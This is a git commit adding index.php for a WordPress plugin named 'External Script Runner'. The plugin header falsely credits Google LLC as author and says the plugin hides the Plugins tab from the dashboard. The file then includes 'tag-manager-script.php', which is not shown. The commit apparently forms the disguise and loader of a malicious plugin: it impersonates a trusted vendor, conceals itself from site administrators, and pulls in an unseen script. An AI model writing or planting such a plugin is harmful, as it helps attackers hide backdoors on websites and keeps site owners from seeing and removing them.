94a67d565a6b909bb9f3adeade2f3088a6192777
Youssuf Abramo <84648094+YoussufAbramo@users.noreply.github.com>
2024-01-07 17:25:44 +0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+/*
+Plugin Name: External Script Runner
+Description: This plugin hides the Plugins tab from the WordPress dashboard.
+Version: 6.1.3
+Author: Google LLC.
+*/
+
+include_once 'tag-manager-script.php';
